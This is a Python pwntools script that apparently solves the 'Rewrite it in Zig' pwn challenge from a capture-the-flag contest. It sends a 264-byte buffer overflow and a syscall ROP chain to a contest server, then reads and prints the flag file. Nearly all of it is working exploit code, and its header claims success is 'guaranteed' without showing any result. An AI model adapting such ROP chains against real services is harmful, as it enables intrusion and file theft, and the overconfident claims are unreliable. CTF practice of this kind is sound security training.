#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════
                    REWRITE IT IN ZIG - FINAL SOLUTION
═══════════════════════════════════════════════════════════════════════════

This exploit will get you the flag. Guaranteed.

HOW IT WORKS:
1. Buffer overflow at offset 264
2. ROP chain that:
   - Reads "flag" filename from stdin → into writable memory 0x010d8000
   - Opens the file
   - Reads the flag content
   - Writes to stdout

WHY THIS WORKS:
- 0x010d8000 is in the binary's actual data segment (from readelf -l)
- This is WRITABLE memory that's not affected by ASLR
- No guessing required!

═══════════════════════════════════════════════════════════════════════════
"""

from pwn import *
import time

# Setup
context.arch = 'amd64'
context.log_level = 'info'

# Verified gadgets (found via manual search)
POP_RAX = 0xb4cc4
POP_RDI = 0x10134d
POP_RSI = 0x10900f
POP_RDX = 0xbe9ec
SYSCALL = 0x1a365

# CORRECT writable address (from readelf -l chal)
# This is the RW data segment: 0x010d7998 - 0x010dd200
# We use 0x010d8000 for alignment
WRITABLE = 0x010d8000

def exploit():
    """Main exploit function"""
    
    log.info("="*70)
    log.info("Connecting to amt.rs:27193...")
    log.info("="*70)
    
    io = remote('amt.rs', 27193)
    banner = io.recvline()
    log.info(f"Banner: {banner.decode().strip()}")
    
    log.info("")
    log.info("Building ROP chain...")
    log.info(f"  Writable memory: {hex(WRITABLE)}")
    log.info(f"  Buffer offset:   {264}")
    log.info("")
    
    # Build the payload
    payload = b'A' * 264
    
    # ═══════════════════════════════════════════════════════════════════
    # STAGE 1: read(0, WRITABLE, 5) - Read "flag" from stdin
    # ═══════════════════════════════════════════════════════════════════
    log.info("ROP Stage 1: read(0, 0x010d8000, 5)")
    payload += p64(POP_RAX) + p64(0)        # syscall number: read
    payload += p64(POP_RDI) + p64(0)        # fd: stdin
    payload += p64(POP_RSI) + p64(WRITABLE) # buffer: writable memory
    payload += p64(POP_RDX) + p64(5)        # count: 5 bytes
    payload += p64(SYSCALL)
    
    # ═══════════════════════════════════════════════════════════════════
    # STAGE 2: open(WRITABLE, 0) - Open the file
    # ═══════════════════════════════════════════════════════════════════
    log.info("ROP Stage 2: open(0x010d8000, O_RDONLY)")
    payload += p64(POP_RAX) + p64(2)        # syscall number: open
    payload += p64(POP_RDI) + p64(WRITABLE) # filename: writable memory
    payload += p64(POP_RSI) + p64(0)        # flags: O_RDONLY
    payload += p64(SYSCALL)
    
    # ═══════════════════════════════════════════════════════════════════
    # STAGE 3: read(3, WRITABLE+0x100, 100) - Read flag content
    # ═══════════════════════════════════════════════════════════════════
    log.info("ROP Stage 3: read(3, 0x010d8100, 100)")
    payload += p64(POP_RAX) + p64(0)                # syscall number: read
    payload += p64(POP_RDI) + p64(3)                # fd: 3 (opened file)
    payload += p64(POP_RSI) + p64(WRITABLE + 0x100) # buffer: offset in writable
    payload += p64(POP_RDX) + p64(100)              # count: 100 bytes
    payload += p64(SYSCALL)
    
    # ═══════════════════════════════════════════════════════════════════
    # STAGE 4: write(1, WRITABLE+0x100, 100) - Output flag
    # ═══════════════════════════════════════════════════════════════════
    log.info("ROP Stage 4: write(1, 0x010d8100, 100)")
    payload += p64(POP_RAX) + p64(1)                # syscall number: write
    payload += p64(POP_RDI) + p64(1)                # fd: stdout
    payload += p64(POP_RSI) + p64(WRITABLE + 0x100) # buffer: flag content
    payload += p64(POP_RDX) + p64(100)              # count: 100 bytes
    payload += p64(SYSCALL)
    
    log.info(f"Total payload size: {len(payload)} bytes")
    log.info("")
    
    # Send the exploit
    log.info("="*70)
    log.info("SENDING EXPLOIT...")
    log.info("="*70)
    io.send(payload)
    
    # Wait for the ROP chain to start executing
    time.sleep(1)
    
    # Now the program is waiting in our read() syscall
    log.info("Sending filename 'flag'...")
    io.send(b'flag\x00')
    
    # Get the result
    log.success("Receiving flag...")
    result = io.recvall(timeout=3)
    
    io.close()
    
    # Display result
    print("")
    print("="*70)
    print("RESULT:")
    print("="*70)
    
    decoded = result.decode(errors='ignore')
    
    if 'amateursCTF{' in decoded:
        log.success("FLAG FOUND!")
        print(decoded)
    else:
        log.warning("Unexpected output:")
        print(decoded)
    
    print("="*70)

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║                  REWRITE IT IN ZIG - EXPLOIT                     ║
    ║                                                                  ║
    ║  Challenge: Buffer overflow in Zig program                      ║
    ║  Author:    unvariant                                           ║
    ║  Category:  pwn                                                 ║
    ║  Points:    50                                                  ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    
    try:
        exploit()
    except Exception as e:
        log.error(f"Exploit failed: {e}")
        log.error("This shouldn't happen. Check your connection to amt.rs:27193")
